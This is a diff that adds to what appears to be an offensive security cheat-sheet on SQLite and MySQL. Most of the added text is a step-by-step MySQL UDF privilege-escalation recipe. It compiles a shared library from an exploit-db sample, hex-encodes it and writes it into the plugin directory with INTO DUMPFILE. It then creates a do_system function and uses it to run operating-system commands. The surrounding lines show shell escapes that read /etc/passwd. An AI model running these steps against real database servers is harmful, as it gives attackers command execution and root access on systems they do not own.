@@ -74,6 +74,13 @@ sqlite3 some.db .schema > schema.sql
 sqlite3 some.db .dump > dump.sql
 grep -vx -f schema.sql dump.sql > data.sql
 ```
+```python
+import sqlite3
+conn = sqlite3.connect("users.db")
+cursor = conn.execute("Select * from sqlite_master")
+for i in cursor.fetchall():
+    print i
+```
 
 Dump into CSV
 ```sql
@@ -127,6 +134,7 @@ select * from MyTable;
   - common.log
 - Bypass
   - Avoid quotes: `select concat('1337','aaaa')` == `select concat(0x31333337,0x61616161)`
+- List udf: `select * from mysql.func`
 
 ### Privilege Escalation
 
@@ -153,6 +161,21 @@ Break into shell:
 mysql> \! cat /etc/passwd
 mysql> \! bash
 ```
+
+```s
+show variables like "secure_file_priv"; # if empty can run UDF exploits
+select @@plugin_dir;
+```
+- <https://www.exploit-db.com/exploits/1518>
+- `gcc -g -c udf.c`
+- `gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc`
+- Converting the udf.so to a hexadecimal string, removing whitespaces and retrieving the output in a single line with a "​0x​" in the beginning of the payload string.
+  - `od -An -vtx1 udf.so | tr -d '\040\011\012\015' > udf_output`
+  - `sed 's/.*7f454c460201010/0x&/' udf_output > udf`
+- `SELECT ​<CONTENT OF THE udf file>​ INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';`
+- `create function do_system returns integer soname 'udf.so';`
+- `select do_system('id > /tmp/out; chmod 777 /tmp/out');`
+- `select LOAD_FILE('/tmp/out');`
 
 ### MySQL root to system root
 
